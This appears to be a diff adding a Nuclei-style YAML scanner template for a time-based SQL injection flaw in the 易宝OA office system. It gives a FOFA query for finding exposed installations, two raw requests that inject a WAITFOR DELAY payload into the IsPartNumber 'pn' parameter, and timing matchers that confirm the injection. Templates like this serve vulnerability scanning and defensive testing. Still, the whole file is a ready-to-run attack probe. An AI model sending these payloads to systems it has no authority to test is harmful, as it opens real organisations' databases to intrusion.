@@ -1,0 +1,38 @@
+id: poc-yaml-yi-bao-oa-system-ispartnumber-sqli
+info:
+  name: 易宝OA系统 IsPartNumber SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: 易宝OA
+  metadata:
+    finger: 易宝OA
+    fofa: app="顶讯科技-易宝OA系统"
+
+http:
+  - raw:
+      - |
+        GET /SmartTradeScan/Inventory/IsPartNumber?StockRoomID=1&pn=2%27%3BWAITFOR+DELAY+%270%3A0%3A5%27-- HTTP/1.1
+        Host: {{Hostname}}
+      - |
+        GET /SmartTradeScan/Inventory/IsPartNumber?StockRoomID=1&pn=2%27%3BWAITFOR+DELAY+%270%3A0%3A8%27-- HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "success"
+          - "true"
+      - type: word
+        part: header
+        words:
+          - "application/json"
+      - type: dsl
+        dsl:
+          - 'duration_1>=5 && duration_1<=6'
+          - 'duration_2 - duration_1 >2'
+        condition: and
+
